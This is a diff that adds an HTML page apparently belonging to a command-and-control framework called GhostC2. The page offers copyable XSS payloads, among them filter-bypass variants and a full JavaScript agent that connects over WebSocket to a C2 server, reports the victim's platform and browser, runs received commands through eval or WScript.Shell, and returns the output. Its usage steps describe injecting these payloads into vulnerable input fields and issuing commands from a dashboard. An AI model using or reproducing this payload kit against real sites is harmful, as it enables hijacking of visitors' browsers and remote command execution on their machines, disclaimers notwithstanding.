@@ -1,0 +1,268 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GhostC2 XSS Payload</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 20px;
+            background: #1a1a1a;
+            color: #00d4ff;
+        }
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            background: #2a2a2a;
+            padding: 20px;
+            border-radius: 10px;
+            border: 1px solid #00d4ff;
+        }
+        .payload {
+            background: #000;
+            color: #00ff00;
+            padding: 15px;
+            border-radius: 5px;
+            font-family: monospace;
+            white-space: pre-wrap;
+            word-break: break-all;
+            margin: 10px 0;
+        }
+        .warning {
+            background: #ff6b6b;
+            color: white;
+            padding: 10px;
+            border-radius: 5px;
+            margin: 10px 0;
+        }
+        .info {
+            background: #ffd43b;
+            color: #000;
+            padding: 10px;
+            border-radius: 5px;
+            margin: 10px 0;
+        }
+        h1, h2 {
+            color: #00d4ff;
+        }
+        .copy-btn {
+            background: #00d4ff;
+            color: #000;
+            border: none;
+            padding: 8px 16px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin: 5px;
+        }
+        .copy-btn:hover {
+            background: #0099cc;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1><i class="fas fa-ghost"></i> GhostC2 XSS Payload Generator</h1>
+        
+        <div class="warning">
+            <strong>⚠️ WARNING:</strong> This tool is for educational and authorized testing purposes only. 
+            Only use on systems you own or have explicit permission to test.
+        </div>
+
+        <h2>1. Basic XSS Payload</h2>
+        <div class="info">
+            Use this payload to test basic XSS vulnerabilities:
+        </div>
+        <div class="payload" id="basicPayload">
+&lt;script&gt;alert('XSS Test')&lt;/script&gt;</div>
+        <button class="copy-btn" onclick="copyToClipboard('basicPayload')">Copy Basic Payload</button>
+
+        <h2>2. GhostC2 JavaScript Reverse Shell</h2>
+        <div class="info">
+            This payload will establish a reverse shell connection to the GhostC2 server:
+        </div>
+        <div class="payload" id="ghostc2Payload">
+&lt;script&gt;
+(function() {
+    'use strict';
+    const SERVER_URL = 'ws://localhost:8080/ws';
+    const AGENT_ID = 'xss_agent_' + Math.random().toString(36).substr(2, 9);
+    let ws = null;
+    let reconnectAttempts = 0;
+    const MAX_RECONNECT_ATTEMPTS = 5;
+    
+    const log = (msg) => console.log(`[GhostC2] ${msg}`);
+    const error = (msg) => console.error(`[GhostC2] ${msg}`);
+    
+    function executeCommand(command) {
+        return new Promise((resolve) => {
+            let output = '';
+            try {
+                if (command.startsWith('js:')) {
+                    const jsCode = command.substring(3);
+                    const result = eval(jsCode);
+                    output = String(result);
+                } else if (typeof ActiveXObject !== 'undefined') {
+                    const shell = new ActiveXObject('WScript.Shell');
+                    const exec = shell.Exec(command);
+                    output = exec.StdOut.ReadAll() + exec.StdErr.ReadAll();
+                } else {
+                    output = `Command execution not supported: ${command}`;
+                }
+            } catch (e) {
+                output = `Error: ${e.message}`;
+            }
+            resolve(output);
+        });
+    }
+    
+    function sendResult(command, output) {
+        if (ws && ws.readyState === WebSocket.OPEN) {
+            const message = {
+                type: 'result',
+                agent_id: AGENT_ID,
+                command: command,
+                output: output,
+                timestamp: new Date().toISOString()
+            };
+            ws.send(JSON.stringify(message));
+        }
+    }
+    
+    function connect() {
+        try {
+            ws = new WebSocket(SERVER_URL);
+            ws.onopen = function() {
+                log('Connected to GhostC2 server');
+                reconnectAttempts = 0;
+                const registerMsg = {
+                    type: 'register',
+                    agent_id: AGENT_ID,
+                    platform: navigator.platform,
+                    userAgent: navigator.userAgent,
+                    timestamp: new Date().toISOString()
+                };
+                ws.send(JSON.stringify(registerMsg));
+            };
+            ws.onmessage = function(event) {
+                try {
+                    const message = JSON.parse(event.data);
+                    if (message.type === 'command') {
+                        log(`Received command: ${message.command}`);
+                        executeCommand(message.command).then(output => {
+                            sendResult(message.command, output);
+                        });
+                    }
+                } catch (e) {
+                    error(`Failed to parse message: ${e.message}`);
+                }
+            };
+            ws.onclose = function() {
+                log('Connection closed');
+                if (reconnectAttempts < MAX_RECONNECT_ATTEMPTS) {
+                    reconnectAttempts++;
+                    setTimeout(connect, 1000 * Math.pow(2, reconnectAttempts));
+                }
+            };
+            ws.onerror = function(error) {
+                error(`WebSocket error: ${error}`);
+            };
+        } catch (e) {
+            error(`Failed to connect: ${e.message}`);
+        }
+    }
+    
+    function init() {
+        log('GhostC2 XSS payload initializing...');
+        log(`Agent ID: ${AGENT_ID}`);
+        connect();
+        setInterval(() => {
+            if (ws && ws.readyState === WebSocket.OPEN) {
+                ws.send(JSON.stringify({
+                    type: 'ping',
+                    agent_id: AGENT_ID,
+                    timestamp: new Date().toISOString()
+                }));
+            }
+        }, 30000);
+    }
+    
+    init();
+})();
+&lt;/script&gt;</div>
+        <button class="copy-btn" onclick="copyToClipboard('ghostc2Payload')">Copy GhostC2 Payload</button>
+
+        <h2>3. URL Encoded Payload</h2>
+        <div class="info">
+            Use this URL-encoded version for URL-based XSS:
+        </div>
+        <div class="payload" id="urlEncodedPayload">
+%3Cscript%3Ealert('XSS%20Test')%3C/script%3E</div>
+        <button class="copy-btn" onclick="copyToClipboard('urlEncodedPayload')">Copy URL Encoded</button>
+
+        <h2>4. HTML Entity Encoded</h2>
+        <div class="info">
+            Use this HTML entity encoded version for bypassing filters:
+        </div>
+        <div class="payload" id="htmlEncodedPayload">
+&lt;script&gt;alert('XSS Test')&lt;/script&gt;</div>
+        <button class="copy-btn" onclick="copyToClipboard('htmlEncodedPayload')">Copy HTML Encoded</button>
+
+        <h2>5. Advanced Bypass Techniques</h2>
+        <div class="info">
+            Various techniques to bypass XSS filters:
+        </div>
+        
+        <h3>Case Variation</h3>
+        <div class="payload" id="caseVariation">
+&lt;ScRiPt&gt;alert('XSS')&lt;/ScRiPt&gt;</div>
+        <button class="copy-btn" onclick="copyToClipboard('caseVariation')">Copy Case Variation</button>
+
+        <h3>Event Handler</h3>
+        <div class="payload" id="eventHandler">
+&lt;img src=x onerror=alert('XSS')&gt;</div>
+        <button class="copy-btn" onclick="copyToClipboard('eventHandler')">Copy Event Handler</button>
+
+        <h3>JavaScript Protocol</h3>
+        <div class="payload" id="jsProtocol">
+&lt;a href="javascript:alert('XSS')"&gt;Click me&lt;/a&gt;</div>
+        <button class="copy-btn" onclick="copyToClipboard('jsProtocol')">Copy JS Protocol</button>
+
+        <h2>Usage Instructions</h2>
+        <div class="info">
+            <ol>
+                <li>Start the GhostC2 server: <code>go run server/main.go</code></li>
+                <li>Copy the appropriate payload based on your target</li>
+                <li>Inject the payload into vulnerable input fields</li>
+                <li>Monitor the GhostC2 dashboard for agent connections</li>
+                <li>Send commands through the dashboard interface</li>
+            </ol>
+        </div>
+
+        <div class="warning">
+            <strong>⚠️ Legal Notice:</strong> Only use these payloads on systems you own or have explicit written permission to test. 
+            Unauthorized testing may be illegal and could result in legal consequences.
+        </div>
+    </div>
+
+    <script>
+        function copyToClipboard(elementId) {
+            const element = document.getElementById(elementId);
+            const text = element.textContent;
+            
+            navigator.clipboard.writeText(text).then(function() {
+                alert('Payload copied to clipboard!');
+            }).catch(function(err) {
+                // Fallback for older browsers
+                const textArea = document.createElement('textarea');
+                textArea.value = text;
+                document.body.appendChild(textArea);
+                textArea.select();
+                document.execCommand('copy');
+                document.body.removeChild(textArea);
+                alert('Payload copied to clipboard!');
+            });
+        }
+    </script>
+</body>
+</html>
